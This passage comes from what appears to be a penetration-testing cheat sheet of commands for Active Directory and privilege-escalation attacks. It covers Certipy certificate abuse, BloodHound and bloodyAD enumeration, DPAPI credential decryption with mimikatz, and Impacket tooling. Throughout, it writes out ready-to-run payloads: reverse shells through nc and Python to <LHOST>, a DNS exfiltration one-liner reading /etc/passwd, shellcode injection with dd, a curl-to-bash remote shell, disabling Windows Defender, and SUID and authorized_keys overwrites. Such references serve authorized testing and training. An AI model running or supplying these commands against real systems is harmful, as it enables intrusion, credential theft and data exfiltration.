	- GenericWrite over any account A to compromise any account B without a userPrincipalName property (machine accounts and built-in domain administrator Administrator)

#### Usage

##### Case 1

```c
$ certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

##### Case 2

```c
$ certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
```

```c
$ certipy req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
```

```c
$ certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
```

### ESC11: IF_ENFORCEENCRYPTICERTREQUEST

#### Prerequisistes

- Certificate Authority is not configured with IF_ENFORCEENCRYPTICERTREQUEST

##### Usage

```c
$ certipy relay -target 'rpc://<CA>' -ca 'CA'
```

```c
$ certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

## ADMiner

> https://github.com/Mazars-Tech/AD_Miner

### Installation

```c
$ pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
```

### Basic Commands

```c
$ AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
```

## Apache2

### Read first Line of a File with apache2 Binary

```c
$ sudo /usr/sbin/apache2 -f <FILE>
```

## AppLocker

> https://github.com/api0cradle/UltimateAppLockerByPassList

### Bypass List (Windows 10 Build 1803)

```c
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

## APT

```c
$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```

## arua2c

```c
$ aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```

## Bash

### SUID Privilege Escalation

```c
$ cp /bin/bash .
$ chmod +s bash
$ bash -p
```

### White Collar eval Arbitrary Code Execution

> https://www.vidarholen.net/contents/blog/?p=716

#### Example

```c
#!/bin/bash
chmod +s /bin/bash
```

```c
'a[$(/tmp/<FILE>.sh>&2)]+42' /tmp/<FILE>.sh
```

## Bash Debugging Mode

- Bash <4.4

```c
$ env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

## BloodHound

> https://github.com/BloodHoundAD/BloodHound

### Installation

```c
$ sudo apt-get install openjdk-11-jdk
```

```c
$ pip install bloodhound
$ sudo apt-get install neo4j
$ sudo apt-get install bloodhound
```

### Installing and starting Database

```c
$ sudo wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
$ sudo echo 'deb https://debian.neo4j.com stable 4' | sudo tee /etc/apt/sources.list.d/neo4j.list > /dev/null
$ sudo apt-get update
$ sudo apt-get install apt-transport-https
$ sudo apt-get install neo4j
$ sudo systemctl stop neo4j
```

### Starting Neo4j

#### Option 1

```c
$ cd /usr/bin
$ sudo ./neo4j console
```

#### Option 2

```c
$ systemctl start neo4j
```

#### Option 3

```c
$ sudo neo4j start console
```

>  http://localhost:7474/browser/

### Start BloodHound

```c
$ ./bloodhound --no-sandbox
$ sudo bloodhound --no-sandbox
```

#### Alternatively

```c
$ sudo npm install -g electron-packager
$ git clone https://github.com/BloodHoundAD/Bloodhound
$ cd BloodHound
$ npm install
$ npm run linuxbuild
$ cd BloodHound-linux-x64
$ sudo ./BloodHound --no-sandbox
```

### Docker Container

```c
$ docker run \ --publish=7474:7474 --publish=7687:7687 \ --volume=$HOME/neo4j/data:/data \ neo4j
$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
```

### Database Password Reset

>  http://localhost:7474/browser/

```c
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```

### Custom Queries

> https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/bloodhound/Handy-BloodHound-Cypher-Queries.md

#### Custom Query Location on macOS

```c
/System/Volumes/Data/Users/<USERNAME>/Library/Application Support/bloodhound/
```

## BloodHound Python

### Build Docker Container

```c
$ docker build -t bloodhound.py
```

### Collection Method All

```c
$ bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>'-ns <RHOST> -c all --zip
$ bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
$ bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
$ bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
```

### LDAP Dumping

```c
$ bloodhound-python -u <USERNAME> -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c All
```

### Parsing

```c
$ cat 20220629013701_users.json | jq | grep \"name\"
```

#### Searching for User Description in BloodHound Data

```c
$ cat 20220629013701_users.json | jq '.data[].Properties | select(.enabled == true) | .name + " " .description'
```

## bloodyAD

> https://github.com/CravateRouge/bloodyAD

```c
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object Users --attr member                                        // Get group members
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr minPwdLength                 // Get minimum password length policy
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr msDS-Behavior-Version        // Get AD functional level
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type user                       // Get all users of the domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type computer                   // Get all computers of the domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type container                  // Get all containers of the domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> add uac <USERNAME> DONT_REQ_PREAUTH                                   // Enable DONT_REQ_PREAUTH for ASREPRoast
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> remove uac <USERNAME> ACCOUNTDISABLE                                  // Disable ACCOUNTDISABLE
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object <USERNAME> --attr userAccountControl                       // Get UserAccountControl flags
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object '<OBJECT>$' --attr msDS-ManagedPassword                    // Read GMSA account password
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object '<OBJECT>$' --attr ms-Mcs-AdmPwd                           // Read LAPS password
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> add dnsRecord <RECORD> <LHOST>                                        // Add a new DNS entry
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> remove dnsRecord <RECORD> <LHOST>                                     // Remove a DNS entry
$ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get dnsDump                                                           // Get AD DNS records
```

## Certify

> https://github.com/GhostPack/Certify

```c
PS C:\> Certify find /vulnerable
PS C:\> Certify.exe find /vulnerable /currentuser
```

## Certipy

> https://github.com/ly4k/Certipy

> https://github.com/ly4k/BloodHound/

### Common Commands

```c
$ certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
$ certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
```

### Certificate Handling

#### Account Creation

```c
$ certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
```

#### Authentication

```c
$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
```

##### LDAP-Shell

```c
$ certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
```

```c
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

#### Certificate Forging

```c
$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
```

#### Certificate Request

Run the following command twice because of a current issue with `certipy`.

```c
$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
```

```c
$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
$ certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
```

### Start BloodHound Fork

```c
$ ./BloodHound --disable-gpu-sandbox
```

## ClamAV

### File Replacement Privilege Escalation

- Vulnerable Version 1.0.0

```c
$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

#### Example

Create a custom `authorized_keys` file to replace another one.
Then create a custom `database` with the `hex value` of the string you want to parse for.

```c
$ printf ssh | xxd -p
```

##### custom_malware.db

```c
Malware=737368
```

#### Execution

```c
$ clamscan --remove=yes /root/.ssh/authorized_keys -d custom_malware.db
$ clamscan authorized_keys --copy=/root/.ssh/ -d custom_malware.db
```

## Coercer

```c
$ python3 -m coercer scan -t <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -v
```

## Credentials File

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```c
C:\ rundll32 keymgr.dll, KRShowKeyMgr
```

## dd

### Execute Shellcode

```c
$ dd of=/proc/$$/mem bs=1 seek=$(($(cut -d" " -f9</proc/$$/syscall))) if=<(base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F) conv=notrunc
```

## DNS

### Data Exfiltration

#### Extract /etc/passwd

```perl
$ perl -E 'qx^Cdig $_.$$.${\(rand)}.example.com^Cfor(unpack"H*",qx^?cat /etc/pas*^?)=~m^H(..)^Hgc'
```

^C, ^H, and ^? are the corresponding single ASCII values.

## Data Protection API (DPAPI)

- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords

### List Vault

```c
C:\> vaultcmd /listcreds:"Windows Credentials" /all
```

### Credential File Locations

```c
C:\> dir /a:h C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
C:\> dir /a:h C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
```

### Master Key Locations

```c
PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\<SID>
PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\<SID>
```

#### Examples

```c
PS C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Credentials> Get-ChildItem -Hidden
Get-ChildItem -Hidden


    Directory: C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
```

```c
PS C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107> Get-ChildItem -Hidden
Get-ChildItem -Hidden


    Directory: C:\Users\<USERNAME>\Appdata\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d                                 
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb                                                                                             
-a-hs-         1/17/2024   3:43 PM             24 Preferred
```

### Decryption with mimikatz

#### rpc

```c
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

```c
mimikatz # dpapi::cache
```

```c
mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
```

## enum4linux

> https://github.com/CiscoCXSecurity/enum4linux

```c
$ enum4linux -a <RHOST>
```

## enum4linux-ng

> https://github.com/cddmp/enum4linux-ng

```c
$ enum4linux-ng -A <RHOST>
```

## env

```c
$ env
```

## Evil-WinRM

> https://github.com/Hackplayers/evil-winrm

```c
$ evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
```

```c
*Evil-WinRM* PS C:\> menu
```

### Using Certificate and Private Key

```c
$ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

### Deactivate Windows Defender

```c
$ Set-MpPreference -DisableRealtimeMonitoring $true
```

### PowerView

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```c
PS C:\> powershell -ep bypass
PS C:\> . .\PowerView.ps1
```

### Common Commands

```c
PS C:\> Find-InterestingDomainAcl -ResolveGuids
```

### Example

```c
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USERNAME>' -Credential $cred
```

### Check User

```c
PS C:\> Get-DomainUser <USERNAME> -Credential $cred
```

### Code Execution

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami; hostname }
```

### Find a File

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { gci -recurse C:\Users <FILE>.txt }
```

### Read a File

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { cat \PATH\TO\FILE\<FILE>.txt }
```

### Remove a User from a Group

```c
PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { net group "Domain Admins" <USERNAME> /del }
```

## Excel

### .csv Files Command Injection

If the file get's parsed on a Linux operationg system, commands can be injected to the rows.

```c
$ echo '" --exec="\!/dev/shm/<FILE>"' >> /PATH/TO/FILE/<FILE>.csv
```

## find

### Specific Size

```c
$ find / -size 50M    // find files with a size of 50MB
```

### Modified Files

```c
$ find / -mtime 10    // find modified files in the last 10 days
$ find / -atime 10    // find accessed files in the last 10 days
$ find / -cmin -60    // find files changed within the last 60 minutes
$ find / -amin -60    // find files accesses within the last 60 minutes
```

### Passwords

```c
$ find ./ -type f -exec grep --color=always -i -I 'password' {} \;
```

### Group Permissions

```c
$ find / -group <group> 2>/dev/null
```

### User specific Files

```c
$ find / -user <USERNAME> 2>/dev/null
$ find / -user <USERNAME> -ls 2>/dev/null
$ find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
$ find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
```

### SUID and SGID Files

```c
$ find / -perm -4000 2>/dev/null
$ find / -perm -4000 2>/dev/null | xargs ls -la
$ find / -type f -user root -perm -4000 2>/dev/null
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## FullPowers

> https://github.com/itm4n/FullPowers

```c
PS C:\> .\FullPowers.exe -x
PS C:\> .\FullPowers.exe -c "C:\nc64.exe <LHOST> <LPORT> -e cmd" -z
```

## functions

- Bash <4.2-048

```c
$ function /usr/sbin/<BINARY> { /bin/bash -p; }
$ export -f /usr/sbin/<BINARY>
$ /usr/sbin/<BINARY>
```

## gdbus

### Privilege Escalation

> https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/

```c
$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true
```

## gem

```c
$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

## Git

### Git apply (Malicious Patch) Privilege Escalation

#### Payload

```c
diff --git a/x b/../../../home/<USERNAME>/.ssh/authorized_keys
new file mode 100400
index 0000000..a3d61a0
--- /dev/null
+++ b/../../../home/<USERNAME>/.ssh/authorized_keys
@@ -0,0 +1 @@
+<SSH_PUBLIC_KEY>
```

#### Execution

```c
$ git apply patch --unsafe-paths
```

### Git Attributes Privilege Escalation

> https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes#filters_b

Notice that I only found this within a CTF so far. The pre-requisites are
`git commit` get's executed via `script`.

#### Payload

```c
export RHOST="<LHOST>";export RPORT=<LPORT>;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

#### Execution

```c
$ git init
$ echo '*.c filter=indent' > .git/info/attributes
$ git config filter.indent.clean /tmp/<FILE>
$ sudo -u <USERNAME> git-commit.sh
```

## gMSADumper

> https://github.com/micahvandeusen/gMSADumper

```c
$ python3 gMSADumper.py -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -l dc.<DOMAIN>
```

## grep

```c
$ grep -R db_passwd
$ grep -roiE "password.{20}"
$ grep -oiE "password.{20}" /etc/*.conf
$ grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
```

## gsocket

### Shell

```c
$ bash -c "$(curl -fsSL gsocket.io/x)"
```

## Impacket

> https://github.com/fortra/impacket

### Library Protocols

> https://tools.thehacker.recipes/impacket

> https://wadcoms.github.io/

> https://www.kali.org/tools/impacket-scripts/

| Impacket Module | Description |
| --- | --- |
| impacket-addcomputer | It will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the SAMR method. |
| impacket-atexec | It executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. |
| impacket-dcomexec | A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. |
| impacket-dpapi | Allows decrypting vaults, credentials and masterkeys protected by DPAPI. |
| impacket-esentutl | An Extensible Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit). |
| impacket-exchanger | A tool for connecting to MS Exchange via RPC over HTTP v2. |
| impacket-findDelegation | Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment. |
| impacket-Get-GPPPassword | This example extracts and decrypts Group Policy Preferences passwords using streams for treating files instead of mounting shares. Additionally, it can parse GPP XML files offline. |
| impacket-GetADUsers | This script will gather data about the domain’s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. |
| impacket-getArch | This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature. |
| impacket-GetNPUsers | This example will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. |
| impacket-getPac | This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]’s S4USelf + User to User Kerberos Authentication. |
| impacket-getST | Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. |
| impacket-getTGT | Given a password, hash or aesKey, this script will request a TGT and save it as ccache. |
| impacket-GetUserSPNs | This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. |
| impacket-goldenPac | Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. |
| impacket-karmaSMB | A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. |
| impacket-keylistattack | This example implements the Kerberos Key List attack to dump credentials abusing RODCs and Azure AD Kerberos Servers. |
| impacket-kintercept | A tool for intercepting krb5 connections and for testing KDC handling S4U2Self with unkeyed checksum. |
| impacket-lookupsid | A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups. |
| impacket-machine_role | This script retrieves a host's role along with its primary domain details. |
| impacket-mimikatz | Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi. |
| impacket-mqtt_check | Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. |
| impacket-mssqlclient | Alternative method to execute cmd's on MSSQL. |
| impacket-mssqlinstance | Retrieves the instances names from the target host. |
| impacket-netview | Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers. |
| impacket-nmapAnswerMachine | n/a |
| impacket-ntfs-read | NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. |
| impacket-ntlmrelayx | This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. |
| impacket-ping | Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. |
| impacket-ping6 | Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. |
| impacket-psexec | PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom) |
| impacket-raiseChild | This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. |
| impacket-rbcd | Example script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer. |
| impacket-rdp_check | [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example tests whether an account is valid on the target host. |
| impacket-reg | Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. |
| impacket-registry-read | A Windows Registry file format implementation. It allows to parse offline registry hives. |
| impacket-rpcdump | This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. |
| impacket-rpcmap | Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface. |
| impacket-sambaPipe | This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. |
| impacket-samrdump | An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. |
| impacket-secretsdump | Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. |
| impacket-services | This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. |
| impacket-smbclient | A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It’s an excellent example to see how to use impacket.smb in action. |
| impacket-smbexec | A similar approach to PSEXEC w/o using RemComSvc. This implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. |
| impacket-smbpasswd | This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR). |
| impacket-smbrelayx | Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON. |
| impacket-smbserver | A Python implementation of an SMB server. Allows to quickly set up shares and user accounts. |
| impacket-sniff | Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface. |
| impacket-sniffer | Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. |
| impacket-split | n/a |
| impacket-ticketConverter | This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa. |
| impacket-ticketer | This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc. |
| impacket-wmiexec | A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. |
| impacket-wmipersist | This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified. |
| impacket-wmiquery | It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account). |

### Common Commands

```c
$ impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
$ impacket-dcomexec -object MMC20 -debug -silentcommand <DOMAIN>/<USERNAME>:'<PASSWORD>'<DOMAIN_CONTROLLER> '<COMMAND>'
$ impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
$ impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
$ impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
$ impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
$ impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
$ impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
$ impacket-smbserver local . -smb2support
```

### impacket-smbclient

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
```

### impacket-getTGT

```c
$ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
